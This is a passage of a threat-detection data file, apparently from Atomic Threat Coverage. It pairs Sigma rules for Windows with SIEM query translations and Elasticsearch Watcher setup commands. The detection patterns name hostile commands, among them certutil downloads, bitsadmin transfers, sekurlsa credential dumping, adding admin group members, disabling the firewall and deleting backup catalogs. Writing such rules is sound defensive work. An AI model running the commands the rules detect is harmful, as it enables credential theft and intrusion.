event_id=\"4656\" ObjectType=\"SC_MANAGER OBJECT\" ObjectName=\"servicesactive\" Keywords=\"Audit Failure\" SubjectLogonId=\"0x3e4\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4656)(?=.*SC_MANAGER OBJECT)(?=.*servicesactive)(?=.*Audit Failure)(?=.*0x3e4))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1000 SCM Database Privileged Operation\nid: dae8171c-5ec6-4396-b210-8466585b53e9\ndescription: Detects non-system users performing privileged operation os the SCM database\nstatus: experimental\ndate: 2019/08/15\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/07_discovery/T1000_local_admin_check/local_admin_remote_check_openscmanager.md\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4674\n        ObjectType: 'SC_MANAGER OBJECT'\n        ObjectName: 'servicesactive'\n        PrivilegeList: 'SeTakeOwnershipPrivilege'\n        SubjectLogonId: \"0x3e4\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4674\" AND ObjectType:\"SC_MANAGER\\\\ OBJECT\" AND ObjectName:\"servicesactive\" AND PrivilegeList:\"SeTakeOwnershipPrivilege\" AND SubjectLogonId:\"0x3e4\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1000-SCM-Database-Privileged-Operation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1000 SCM Database Privileged Operation\",\\n    \"description\": \"Detects non-system users performing privileged operation os the SCM database\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"4674\\\\\" AND ObjectType:\\\\\"SC_MANAGER\\\\\\\\ OBJECT\\\\\" AND ObjectName:\\\\\"servicesactive\\\\\" AND PrivilegeList:\\\\\"SeTakeOwnershipPrivilege\\\\\" AND SubjectLogonId:\\\\\"0x3e4\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4674\\\\\" AND ObjectType:\\\\\"SC_MANAGER\\\\\\\\ OBJECT\\\\\" AND ObjectName:\\\\\"servicesactive\\\\\" AND PrivilegeList:\\\\\"SeTakeOwnershipPrivilege\\\\\" AND SubjectLogonId:\\\\\"0x3e4\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1000 SCM Database Privileged Operation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4674\" AND ObjectType:\"SC_MANAGER OBJECT\" AND ObjectName:\"servicesactive\" AND PrivilegeList:\"SeTakeOwnershipPrivilege\" AND SubjectLogonId:\"0x3e4\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4674\" ObjectType=\"SC_MANAGER OBJECT\" ObjectName=\"servicesactive\" PrivilegeList=\"SeTakeOwnershipPrivilege\" SubjectLogonId=\"0x3e4\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4674\" ObjectType=\"SC_MANAGER OBJECT\" ObjectName=\"servicesactive\" PrivilegeList=\"SeTakeOwnershipPrivilege\" SubjectLogonId=\"0x3e4\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4674)(?=.*SC_MANAGER OBJECT)(?=.*servicesactive)(?=.*SeTakeOwnershipPrivilege)(?=.*0x3e4))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "action: global\ntitle: SILENTTRINITY stager execution\nid: 03552375-cc2c-4883-bbe4-7958d5a980be\nstatus: experimental\ndescription: Detects SILENTTRINITY stager use\nreferences:\n    - https://github.com/byt3bl33d3r/SILENTTRINITY\nauthor: Aleksey Potapov, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/04\ntags:\n    - attack.execution\ndetection:\n    selection:\n        Description|contains: 'st2stager'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Description.keyword:*st2stager*\\n(EventID:\"7\" AND Description.keyword:*st2stager*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/SILENTTRINITY-stager-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"SILENTTRINITY stager execution\",\\n    \"description\": \"Detects SILENTTRINITY stager use\",\\n    \"tags\": [\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"Description.keyword:*st2stager*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Description.keyword:*st2stager*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'SILENTTRINITY stager execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/SILENTTRINITY-stager-execution-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"SILENTTRINITY stager execution\",\\n    \"description\": \"Detects SILENTTRINITY stager use\",\\n    \"tags\": [\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7\\\\\" AND Description.keyword:*st2stager*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7\\\\\" AND Description.keyword:*st2stager*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'SILENTTRINITY stager execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Description.keyword:*st2stager*\\n(EventID:\"7\" AND Description.keyword:*st2stager*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "Description=\"*st2stager*\"\\n(EventID=\"7\" Description=\"*st2stager*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Description=\"*st2stager*\")\\n(event_id=\"7\" Description=\"*st2stager*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*st2stager.*'\\ngrep -P '^(?:.*(?=.*7)(?=.*.*st2stager.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Addition of Domain Trusts\nid: 0255a820-e564-4e40-af2b-6ac61160335c\nstatus: stable\ndescription: Addition of domains is seldom and should be verified for legitimacy.\nauthor: Thomas Patzke\ntags:\n    - attack.persistence\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4706\n    condition: selection\nfalsepositives:\n    - Legitimate extension of domain structure\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:\"4706\"", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Addition-of-Domain-Trusts <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Addition of Domain Trusts\",\\n    \"description\": \"Addition of domains is seldom and should be verified for legitimacy.\",\\n    \"tags\": [\\n      \"attack.persistence\"\\n    ],\\n    \"query\": \"EventID:\\\\\"4706\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:\\\\\"4706\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Addition of Domain Trusts\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:\"4706\"", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "EventID=\"4706\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4706\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^4706'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Certutil Encode\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: experimental\ndescription: Detects suspicious a certutil command that used to encode files, which is sometimes used for data exfiltration\nreferences:\n    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\nauthor: Florian Roth\ndate: 2019/02/24\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - certutil -f -encode *\n            - certutil.exe -f -encode *\n            - certutil -encode -f *\n            - certutil.exe -encode -f *\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(certutil\\\\ \\\\-f\\\\ \\\\-encode\\\\ * OR certutil.exe\\\\ \\\\-f\\\\ \\\\-encode\\\\ * OR certutil\\\\ \\\\-encode\\\\ \\\\-f\\\\ * OR certutil.exe\\\\ \\\\-encode\\\\ \\\\-f\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Certutil-Encode <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Certutil Encode\",\\n    \"description\": \"Detects suspicious a certutil command that used to encode files, which is sometimes used for data exfiltration\",\\n    \"tags\": \"\",\\n    \"query\": \"CommandLine.keyword:(certutil\\\\\\\\ \\\\\\\\-f\\\\\\\\ \\\\\\\\-encode\\\\\\\\ * OR certutil.exe\\\\\\\\ \\\\\\\\-f\\\\\\\\ \\\\\\\\-encode\\\\\\\\ * OR certutil\\\\\\\\ \\\\\\\\-encode\\\\\\\\ \\\\\\\\-f\\\\\\\\ * OR certutil.exe\\\\\\\\ \\\\\\\\-encode\\\\\\\\ \\\\\\\\-f\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(certutil\\\\\\\\ \\\\\\\\-f\\\\\\\\ \\\\\\\\-encode\\\\\\\\ * OR certutil.exe\\\\\\\\ \\\\\\\\-f\\\\\\\\ \\\\\\\\-encode\\\\\\\\ * OR certutil\\\\\\\\ \\\\\\\\-encode\\\\\\\\ \\\\\\\\-f\\\\\\\\ * OR certutil.exe\\\\\\\\ \\\\\\\\-encode\\\\\\\\ \\\\\\\\-f\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Certutil Encode\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(certutil \\\\-f \\\\-encode * certutil.exe \\\\-f \\\\-encode * certutil \\\\-encode \\\\-f * certutil.exe \\\\-encode \\\\-f *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"certutil -f -encode *\" OR CommandLine=\"certutil.exe -f -encode *\" OR CommandLine=\"certutil -encode -f *\" OR CommandLine=\"certutil.exe -encode -f *\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"certutil -f -encode *\", \"certutil.exe -f -encode *\", \"certutil -encode -f *\", \"certutil.exe -encode -f *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*certutil -f -encode .*|.*certutil\\\\.exe -f -encode .*|.*certutil -encode -f .*|.*certutil\\\\.exe -encode -f .*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Code Page Switch\nid: c7942406-33dd-4377-a564-0f62db0593a3\nstatus: experimental\ndescription: Detects a code page switch in command line or batch scripts to a rare language\nauthor: Florian Roth\ndate: 2019/10/14\nreferences:\n    - https://docs.microsoft.com/en-us/windows/win32/intl/code-page-identifiers\n    - https://twitter.com/cglyer/status/1183756892952248325\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: \n            - 'chcp* 936'  # Chinese\n            # - 'chcp* 1256' # Arabic\n            - 'chcp* 1258' # Vietnamese\n            # - 'chcp* 855'  # Russian\n            # - 'chcp* 866'  # Russian\n            # - 'chcp* 864'  # Arabic\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - \"Administrative activity (adjust code pages according to your organisation's region)\"\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(chcp*\\\\ 936 OR chcp*\\\\ 1258)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Code-Page-Switch <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Code Page Switch\",\\n    \"description\": \"Detects a code page switch in command line or batch scripts to a rare language\",\\n    \"tags\": \"\",\\n    \"query\": \"CommandLine.keyword:(chcp*\\\\\\\\ 936 OR chcp*\\\\\\\\ 1258)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(chcp*\\\\\\\\ 936 OR chcp*\\\\\\\\ 1258)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Code Page Switch\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(chcp* 936 chcp* 1258)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"chcp* 936\" OR CommandLine=\"chcp* 1258\") | table ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"chcp* 936\", \"chcp* 1258\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*chcp.* 936|.*chcp.* 1258)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Firewall Disabled via Netsh\nid: 57c4bf16-227f-4394-8ec7-1b745ee061c3\ndescription: Detects netsh commands that turns off the Windows firewall\nreferences:\n    - https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/\n    - https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/\ndate: 2019/11/01\nstatus: experimental\nauthor: Fatih Sirin\ntags:\n    - attack.defense_evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - netsh firewall set opmode mode=disable\n            - netsh advfirewall set * state off\n    condition: selection\nfalsepositives:\n    - Legitimate administration\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(netsh\\\\ firewall\\\\ set\\\\ opmode\\\\ mode\\\\=disable OR netsh\\\\ advfirewall\\\\ set\\\\ *\\\\ state\\\\ off)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Firewall-Disabled-via-Netsh <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Firewall Disabled via Netsh\",\\n    \"description\": \"Detects netsh commands that turns off the Windows firewall\",\\n    \"tags\": [\\n      \"attack.defense_evasion\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(netsh\\\\\\\\ firewall\\\\\\\\ set\\\\\\\\ opmode\\\\\\\\ mode\\\\\\\\=disable OR netsh\\\\\\\\ advfirewall\\\\\\\\ set\\\\\\\\ *\\\\\\\\ state\\\\\\\\ off)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(netsh\\\\\\\\ firewall\\\\\\\\ set\\\\\\\\ opmode\\\\\\\\ mode\\\\\\\\=disable OR netsh\\\\\\\\ advfirewall\\\\\\\\ set\\\\\\\\ *\\\\\\\\ state\\\\\\\\ off)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Firewall Disabled via Netsh\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(netsh firewall set opmode mode=disable netsh advfirewall set * state off)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"netsh firewall set opmode mode=disable\" OR CommandLine=\"netsh advfirewall set * state off\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"netsh firewall set opmode mode=disable\", \"netsh advfirewall set * state off\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*netsh firewall set opmode mode=disable|.*netsh advfirewall set .* state off)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: MsiExec Web Install\nid: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\nstatus: experimental\ndescription: Detects suspicious msiexec process starts with web addreses as parameter\nreferences:\n    - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\ntags:\n    - attack.defense_evasion\nauthor: Florian Roth\ndate: 2018/02/09\nmodified: 2012/12/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* msiexec*://*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ msiexec*\\\\:\\\\/\\\\/*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/MsiExec-Web-Install <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"MsiExec Web Install\",\\n    \"description\": \"Detects suspicious msiexec process starts with web addreses as parameter\",\\n    \"tags\": [\\n      \"attack.defense_evasion\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ msiexec*\\\\\\\\:\\\\\\\\/\\\\\\\\/*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ msiexec*\\\\\\\\:\\\\\\\\/\\\\\\\\/*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'MsiExec Web Install\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* msiexec*\\\\:\\\\/\\\\/*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* msiexec*://*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* msiexec*://*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* msiexec.*://.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Process Creation\nid: 5f0f47a5-cb16-4dbe-9e31-e8d976d73de3\ndescription: Detects suspicious process starts on Windows systems based on keywords\nstatus: experimental\nreferences:\n    - https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/\n    - https://www.youtube.com/watch?v=H3t_kHQG1Js&feature=youtu.be&t=15m35s\n    - https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/\n    - https://twitter.com/subTee/status/872244674609676288\n    - https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/remote-tool-examples\n    - https://tyranidslair.blogspot.ca/2017/07/dg-on-windows-10-s-executing-arbitrary.html\n    - https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/\n    - https://subt0x10.blogspot.ca/2017/04/bypassing-application-whitelisting.html\n    - https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46#file-rat-bat\n    - https://twitter.com/vector_sec/status/896049052642533376\n    - http://security-research.dyndns.org/pub/slides/FIRST-TC-2018/FIRST-TC-2018_Tom-Ueltschi_Sysmon_PUBLIC.pdf\nauthor: Florian Roth, Daniil Yugoslavskiy, oscd.community (update)\nmodified: 2019/11/01\ntags:\n    - car.2013-07-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* sekurlsa:*'\n            - net localgroup administrators * /add\n            - net group \"Domain Admins\" * /ADD /DOMAIN\n            - certutil.exe *-urlcache* http*\n            - certutil.exe *-urlcache* ftp*\n            - netsh advfirewall firewall *\\AppData\\\\*\n            - attrib +S +H +R *\\AppData\\\\*\n            - schtasks* /create *\\AppData\\\\*\n            - schtasks* /sc minute*\n            - '*\\Regasm.exe *\\AppData\\\\*'\n            - '*\\Regasm *\\AppData\\\\*'\n            - '*\\bitsadmin* /transfer*'\n            - '*\\certutil.exe * -decode *'\n            - '*\\certutil.exe * -decodehex *'\n            - '*\\certutil.exe -ping *'\n            - icacls * /grant Everyone:F /T /C /Q\n            - '* wbadmin.exe delete catalog -quiet*'\n            - '*\\wscript.exe *.jse'\n            - '*\\wscript.exe *.js'\n            - '*\\wscript.exe 